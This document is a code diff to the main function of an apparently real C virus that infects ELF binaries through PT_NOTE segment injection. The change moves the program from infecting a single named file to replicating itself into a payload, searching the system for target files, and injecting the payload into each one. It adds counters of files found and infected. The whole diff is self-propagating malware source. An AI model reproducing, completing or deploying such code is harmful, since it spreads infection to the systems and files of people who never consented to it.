@@ -7,19 +7,19 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-int main(int argc, char *argv[]) {
+int main(void) {
+    /*
     if (argc != 2) {
         LOG_DEBUG("Usage: %s {elf file}.\n", argv[0]);
         return 1;
     }
+    */
 
-    /*
     LOG_DEBUG("protection: avoid an unintentional infection");
     if (protection()) {
         LOG_DEBUG("Protection failed.");
         return 1;
     }
-    */
 
     // inject `xxd -i stub.bin` here
     unsigned char stub_bin[] = {
@@ -44,24 +44,43 @@ int main(int argc, char *argv[]) {
     unsigned char *payload_bin = NULL;
     size_t payload_size = -1;
 
-    /*
     struct queue files;
     STAILQ_INIT(&files);
     struct entry *f;
-    */
 
-    replication(&payload_bin, &payload_size, stub_bin, stub_bin_len);
-    /*
-    propagation(&files);
-    STAILQ_FOREACH(f, &files, link) {
-        printf("infecting: %s", f->path);
-        infect_ptnote(f->path, payload_bin, payload_size);
+#ifdef DEBUG
+    int total_file_found = 0;
+    int total_file_infected = 0;
+#endif
+
+    LOG_DEBUG("replication: merging stub and self file in payload.");
+    if (replication(&payload_bin, &payload_size, stub_bin, stub_bin_len)) {
+        LOG_DEBUG("replication failed.");
+        return 1;
     }
-    */
-    infect_ptnote(argv[1], payload_bin, payload_size);
+
+    LOG_DEBUG("propagation: searching files to infect.");
+    if (propagation(&files)) {
+        LOG_DEBUG("propagation failed.");
+        return 1;
+    }
+
+    LOG_DEBUG("infect_ptnote: inject payload at the end of the file target.");
+    STAILQ_FOREACH(f, &files, link) {
+#ifdef DEBUG
+        total_file_found++;
+        if (infect_ptnote(f->path, payload_bin, payload_size) == 0)
+            total_file_infected++;
+#else
+        infect_ptnote(f->path, payload_bin, payload_size);
+#endif
+
+    }
+    LOG_DEBUG("found %d files.", total_file_found);
+    LOG_DEBUG("infected %d files.", total_file_infected);
 
     free(payload_bin);
-    // free_queue(&files);
+    free_queue(&files);
     return 0;
 }
 
